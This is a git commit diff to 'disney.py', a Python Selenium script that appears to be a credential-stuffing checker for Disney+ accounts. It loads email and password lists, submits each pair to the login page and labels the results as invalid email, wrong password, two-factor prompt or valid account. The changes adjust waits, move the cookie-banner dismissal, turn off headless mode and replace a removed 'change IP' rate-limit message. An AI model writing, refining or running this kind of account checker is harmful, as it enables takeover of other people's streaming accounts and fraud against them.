720e35b6465d8e4f8dc75e4b97d252b683894b08
g3th <theinkandpen@yahoo.co.uk>
2022-08-30 03:12:16 +0100

    modified:   disney.py

--- disney.py
+++ disney.py
@@ -16,7 +16,7 @@ passwords = []
 Two_Factor = False
 browser_options = Options()
 browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
-browser_options.headless = True
+#browser_options.headless = True
 os.makedirs('accounts',exist_ok=True)
 with open(file_directory, 'r') as disney:
 	for line in disney.readlines():
@@ -30,15 +30,20 @@ while index != len(users):
 			browser = webdriver.Chrome(options = browser_options)
 			browser.set_window_size(500,700)
 			browser.get(page)
-			time.sleep(5)
-			if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
-				gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
-				gdpr_reject_all.click()
+			time.sleep(7)
 			email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
 			continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
 			email_input_box.send_keys(users[index])
+			if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
+				gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
+				gdpr_reject_all.click()
 			continue_button.click()
-			time.sleep(2)
+			time.sleep(3)
+			if browser.find_elements_by_xpath('/html/body/div[3]/div/div/h4'):
+				email_error = browser.find_element_by_xpath('/html/body/div[3]/div/div/h4').text
+				if "We couldn't find an account for that email" in str(email_error):
+					print(' | {}:{} ---> Invalid Email'.format(users[index],passwords[index]))
+					Two_Factor = True
 			if browser.find_elements_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3'):
 				two_factor_authentication = browser.find_element_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3').text
 				if 'Check your email inbox' in str(two_factor_authentication):
@@ -56,12 +61,7 @@ while index != len(users):
 						print(" | {}:{} ---> Password is incorrect".format(users[index],passwords[index]))
 					if 'Due to' in str(password_or_429_error):
 						#print(password_or_429_error)
-						print(" | 429 Too Many Requests. Please Change IP or Wait a while.\nEnding.\n")
-						exit()
-				if browser.find_elements_by_xpath('//*[@id="app_index"]/div[2]/div/div/h4'):
-					email_error = browser.find_element_by_xpath('//*[@id="app_index"]/div[2]/div/div/h4').text
-					if "We couldn't find" in str(email_error):
-						print(' | {}:{} ---> Invalid Email'.format(users[index],passwords[index]))
+						print(" | Login Blocked.")
 				if browser.find_elements_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2'):
 					valid = browser.find_element_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2').text
 					if "Who's watching?" in str(valid):
